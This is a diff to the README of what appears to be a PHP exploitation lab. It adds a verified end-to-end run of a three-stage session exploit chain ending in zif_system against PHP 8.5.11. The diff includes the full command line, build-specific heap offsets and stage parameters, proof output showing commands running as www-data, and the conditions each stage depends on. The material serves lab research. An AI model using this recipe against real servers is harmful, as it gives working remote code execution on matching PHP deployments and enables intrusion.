@@ -31,24 +31,33 @@ python3 probe_default.py --port 18090 --pressure 1000 --levels 60
 
 The filter target uses `memory_limit=28M` in `lab/httpd-filter.conf`; the default target uses `memory_limit=128M` and `post_max_size=8M` in `lab/httpd-default.conf`. Recalibrate if the name length or body size changes.
 
-## Session chain (calibration scaffold)
+## Session chain
 
 `session_exploit.py` ports the 9bie/Exploit-DB three-stage session chain (pre-RINIT OOM → `Set-Cookie` leaks → fake reference → `zif_system`).
 
+Verified end-to-end against the official PHP 8.5.11 Docker target, twice consecutively:
+
 ```bash
-bash lab/start-apache-session.sh
-python3 session_exploit.py -u http://127.0.0.1:18091/index.php \
-    -c 'id>/tmp/p' --proof-file /tmp/p --poison big --huge-mb 12 --rotate
+sudo bash lab/start-php8511-docker.sh
+python3 session_exploit.py \
+    -u http://127.0.0.1:18093/index.php \
+    -c 'id>/out/p1' --proof-file /tmp/p2s-8511/out/p1 \
+    --poison big --huge-mb 12 --rotate \
+    --zif-offset 0x5996e0 --dtor-offset 0x7b47a0 \
+    --htdata-offset 0x690d8 \
+    --stage1-n 841 --stage1-forge-len 63 \
+    --stage2-t 406 --stage2-v 16 --carrier
 ```
 
-Status: the stage skeleton is ported, but the heap geometry is build-specific. The current defaults are the EDB lab profile; the custom minimal PHP 8.5.11 binary in this repo does not reproduce stage 1 with them (it returns a normal 32-byte session cookie). The verified official 8.5.11 profile is:
+Proof:
 
 ```text
-zif=0x5996e0 dtor=0x7b47a0 htdata=0x690d8
-stage1_n=841 forge=63 stage2_t=406 stage2_v=16 pads=31x6 carrier
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Use that only against a matching official build, or calibrate a profile for this exact `libphp-nts.so`.
+The Docker target must use `session.use_only_cookies=1` (the official default; the launcher now does). Stage 2 also needs the `f0000`/`x` 1001-field poison, and stage 3 needs the bookworm `Cookie: PHPSESSID=aaa...` header to keep `PS(id)` valid.
+
+The heap geometry is build-specific. The custom minimal PHP 8.5.11 binary in this repo does not reproduce stage 1 with the official profile (it returns a normal 32-byte session cookie); use the official Docker target or calibrate a profile for that exact `libphp-nts.so`.
 
 The official calibration probe/sweep is ported in `calibrate_session.py`:
 
